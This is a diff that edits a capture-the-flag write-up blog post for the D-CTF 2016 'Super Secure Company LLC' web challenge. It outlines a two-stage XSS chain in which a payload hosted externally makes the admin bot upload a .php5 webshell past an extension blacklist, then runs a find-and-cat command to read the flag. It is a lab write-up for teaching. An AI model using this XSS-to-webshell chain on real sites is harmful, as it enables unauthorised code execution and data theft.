@@ -3,7 +3,7 @@ layout: post
 title: "D-CTF Qualifiers 2016: Super Secure Company LLC (Web 300)"
 author: f0rki, verr
 categories: writeup
-tags: [cat/web, tools]
+tags: [cat/web, attack/css, lang/php]
 ---
 
 * **Category:** Web
@@ -244,9 +244,8 @@ We are gonna use two XSS stages.
    `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`  
    this way we change the origin back to `127.0.0.1`, can execute JS in the context of the bot and are able to perfrom `POST` requests without violating the same-origin policy and bypassing the admin check.
 
-3. **Stage 2 payload makes an ajax `POST` request** to  
+3. **Stage 2 payload uploads a file using an ajax `POST` request** to
    `http://127.0.0.1/admin.php?page=upload`  
-   and uploads a file.
 
    But the file upload code disallowed certain file extensions:
 
@@ -260,19 +259,15 @@ We are gonna use two XSS stages.
    ?>
    ```
    
-   Fortunately the `.php5` extension was not part of the blacklist, so we just used that.
+   Fortunately the `.php5` extension was not part of the blacklist, so we just used that and hoped for the best.
 
-4. **Upload file with `.php5` extension** and visit  
+4. **Upload file with `.php5` extension to get execute commands.** For example:  
    `http://10.13.37.13/uploads/file_with_more_than_twelve_chars.php5`  
-   to execute the webshell.
-5. **Use webshell** to execute `find / -name *flag* | xargs cat`, which revealed the flag in
-   `/flag`:
+5. **Get flag using the webshell**. We executed `find / -name *flag* | xargs cat`, which revealed the flag in `/flag`:
 
    `DCTF{5a42e723159e537443b99ba7f95fbe04}`
 
 :)
-
----
 
 ### Attack code
 
